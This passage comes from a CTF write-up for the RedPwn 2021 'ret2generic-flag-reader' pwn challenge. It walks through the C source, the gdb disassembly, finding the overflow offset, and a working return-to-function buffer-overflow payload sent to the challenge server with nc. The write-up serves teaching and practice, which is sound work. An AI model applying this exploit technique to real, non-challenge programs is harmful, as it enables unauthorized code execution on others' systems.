  FILE *fp = fopen(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
  <span class="hljs-keyword">if</span> (!fp)
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no flag!! contact a member of rob inc&quot;</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
  }
  fgets(flag, <span class="hljs-number">0xff</span>, fp);
  <span class="hljs-built_in">puts</span>(flag);
  fclose(fp);
}
</div></code></pre>
<p>From my understanding, the function allocates 256 bytes (0x100 in hex) for the flag and fills it with 0s. It then uses <code>fopen()</code> to read a flag.txt file and <code>fgets()</code> the content into the allocated storage.</p>
<ol start="3">
<li>We take a look at the <code>main()</code> function</li>
</ol>
<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
  <span class="hljs-keyword">char</span> comments_and_concerns[<span class="hljs-number">32</span>];

  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);

  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...&quot;</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;how about this, we&#x27;ll make a generic pwnable with an overflow and they&#x27;ve got to ret to some flag reading function!&quot;</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;slap on some flavortext and there&#x27;s no way rob will fire me now!&quot;</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is genius!! what do you think?&quot;</span>);

  gets(comments_and_concerns);
}
</div></code></pre>
<p>...again, <code>gets()</code> used to get user input, however nothing is done with the userinput. So obviously another buffer overflow.</p>
<ol start="4">
<li>
<p>The attack plan is simple. We need to overwrite some return pointers so that the <code>main()</code> function returns to call the <code>super_generic_flag_reading_function_please_ret_to_me()</code> function which prints the flag.</p>
</li>
<li>
<p>We create a demo <code>flag.txt</code> file and fill it with some &quot;Z&quot;s to simulate the server.</p>
</li>
<li>
<p>We run the given binary with <code>gdb</code> and disassemble the <code>main()</code> function first,</p>
</li>
</ol>
<pre><code class="language-asm"><code><div>...

0x00000000004013e8 &lt;+67&gt;:    call   0x4010c0 &lt;setbuf@plt&gt;
   0x00000000004013ed &lt;+72&gt;:    lea    rdi,[rip+0xc4c]        # 0x402040
   0x00000000004013f4 &lt;+79&gt;:    call   0x4010a0 &lt;puts@plt&gt;
   0x00000000004013f9 &lt;+84&gt;:    lea    rdi,[rip+0xca0]        # 0x4020a0
   0x0000000000401400 &lt;+91&gt;:    call   0x4010a0 &lt;puts@plt&gt;
   0x0000000000401405 &lt;+96&gt;:    lea    rdi,[rip+0xd0c]        # 0x402118
   0x000000000040140c &lt;+103&gt;:   call   0x4010a0 &lt;puts@plt&gt;
   0x0000000000401411 &lt;+108&gt;:   lea    rdi,[rip+0xd48]        # 0x402160
   0x0000000000401418 &lt;+115&gt;:   call   0x4010a0 &lt;puts@plt&gt;
   0x000000000040141d &lt;+120&gt;:   lea    rax,[rbp-0x20]
   0x0000000000401421 &lt;+124&gt;:   mov    rdi,rax
   0x0000000000401424 &lt;+127&gt;:   call   0x4010e0 &lt;gets@plt&gt;
   0x0000000000401429 &lt;+132&gt;:   mov    eax,0x0
   0x000000000040142e &lt;+137&gt;:   leave
   0x000000000040142f &lt;+138&gt;:   ret
</div></code></code></pre>
<p>Nothing unusual, we spot the <code>puts()</code> and the <code>gets()</code> and then the program exits. We disassemble the other function too,</p>
<pre><code class="language-asm"><code><div>Dump of assembler code for function super_generic_flag_reading_function_please_ret_to_me:
   0x00000000004011f6 &lt;+0&gt;:     endbr64
   0x00000000004011fa &lt;+4&gt;:     push   rbp
   0x00000000004011fb &lt;+5&gt;:     mov    rbp,rsp
   0x00000000004011fe &lt;+8&gt;:     sub    rsp,0x110
   0x0000000000401205 &lt;+15&gt;:    mov    QWORD PTR [rbp-0x110],0x0
   0x0000000000401210 &lt;+26&gt;:    mov    QWORD PTR [rbp-0x108],0x0
   0x000000000040121b &lt;+37&gt;:    mov    QWORD PTR [rbp-0x100],0x0
   ...

   0x0000000000401333 &lt;+317&gt;:   mov    QWORD PTR [rbp-0x18],0x0
   0x000000000040133b &lt;+325&gt;:   lea    rsi,[rip+0xcc6]        # 0x402008
   0x0000000000401342 &lt;+332&gt;:   lea    rdi,[rip+0xcc1]        # 0x40200a
   0x0000000000401349 &lt;+339&gt;:   call   0x4010f0 &lt;fopen@plt&gt;
   0x000000000040134e &lt;+344&gt;:   mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401352 &lt;+348&gt;:   cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401357 &lt;+353&gt;:   jne    0x40136f &lt;super_generic_flag_reading_function_please_ret_to_me+377&gt;
   0x0000000000401359 &lt;+355&gt;:   lea    rdi,[rip+0xcb8]        # 0x402018
   0x0000000000401360 &lt;+362&gt;:   call   0x4010a0 &lt;puts@plt&gt;
   0x0000000000401365 &lt;+367&gt;:   mov    edi,0xffffffff
   0x000000000040136a &lt;+372&gt;:   call   0x401100 &lt;exit@plt&gt;
   0x000000000040136f &lt;+377&gt;:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401373 &lt;+381&gt;:   lea    rax,[rbp-0x110]
   0x000000000040137a &lt;+388&gt;:   mov    esi,0xff
   0x000000000040137f &lt;+393&gt;:   mov    rdi,rax
   0x0000000000401382 &lt;+396&gt;:   call   0x4010d0 &lt;fgets@plt&gt;
   0x0000000000401387 &lt;+401&gt;:   lea    rax,[rbp-0x110]
   0x000000000040138e &lt;+408&gt;:   mov    rdi,rax
   0x0000000000401391 &lt;+411&gt;:   call   0x4010a0 &lt;puts@plt&gt;
   0x0000000000401396 &lt;+416&gt;:   mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040139a &lt;+420&gt;:   mov    rdi,rax
   0x000000000040139d &lt;+423&gt;:   call   0x4010b0 &lt;fclose@plt&gt;
   0x00000000004013a2 &lt;+428&gt;:   nop
   0x00000000004013a3 &lt;+429&gt;:   leave
   0x00000000004013a4 &lt;+430&gt;:   ret
End of assembler dump.
</div></code></code></pre>
<p>...Looks like the function starts at address <code>0x00000000004011f6</code>. So we need to return to <code>0x00000000004011f6</code> from <code>main()</code> somehow.</p>
<ol start="7">
<li>We run the program normally and use python to print out a bunch of <code>A</code> until we get a segfault. In this case, 40 A's gave us a segmentation fault. We use <code>dmesg | tail</code> to figure out what's going on.</li>
</ol>
<pre><code><code><div>❯ python2 -c &quot;print('A'*40)&quot; | ./ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
[1]    19478 done                python2 -c &quot;print('A'*40)&quot; |
       19479 segmentation fault  ./ret2generic-flag-reader
 ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_ret2generic-flag-reader │ pwn ?1 ▓▒░────────░▒▓ 0|SEGV х │ 12:16:17 PM
❯ dmesg | tail
[328909.667233] ret2generic-fla[19857]: segfault at 7f848d7b14d0 ip 00007f848d7b14d0 sp 00007ffe88da9538 error 15
[328909.667236] Code: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;00&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
</div></code></code></pre>
<p>So we have a segfault at 7f848d7b14d0. Let's write 41 As and see what happens to that address.</p>
<pre><code><code><div>[328992.779647] ret2generic-fla[19868]: segfault at 7fbe2f150041 ip 00007fbe2f150041 sp 00007fff48f61740 error 15 in libc-2.31.so[7fbe2f131000+25000]
</div></code></code></pre>
<p>Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too.</p>
<ol start="8">
<li>
<p>So all we have to do, is replace <code>7fbe2f150041</code> in the dmesg with the adress pointer of our flag printer function, and instead of a Segfault the <code>main()</code> will actually return there, because unlike <code>7fbe2f150041</code>, that address, specifically <code>0x00000000004011f6</code> (found from the disassembly) actually exists.</p>
</li>
<li>
<p>So we have to write 40A's or NoOps and then fill the next 6 bytes with <code>0000004011f6</code></p>
</li>
</ol>
<pre><code class="language-py"><div>python2 -c <span class="hljs-string">&quot;print(&#x27;A&#x27;*40 + &#x27;\xf6\x11\x40\x00\x00\x00&#x27;)&quot;</span>
</div></code></pre>
<p>Due to endianness, we have to write the bytes upside down. Again I chose to go with python2 because of easier output as bytes. Pipe the output to our local binary,</p>
<pre><code><code><div>❯ python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; | ./ret2generic-flag-reader
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
ZZZZZZZZZZZZZZZZZZ

[1]    19503 done                python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; |
       19504 segmentation fault  ./ret2generic-flag-reader
</div></code></code></pre>
<p>...and boom we have our Z's. Now we pipe the output to the server,</p>
<pre><code><code><div>❯ python2 -c &quot;print('A'*40 + '\xf6\x11\x40\x00\x00\x00')&quot; | nc mc.ax 31077
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
</div></code></code></pre>
<p>and we have our flag.</p>
<h5 id="flag-flagrob-loved-the-challenge-but-im-still-paid-minimum-wage">Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}</h5>

    </body>
    </html>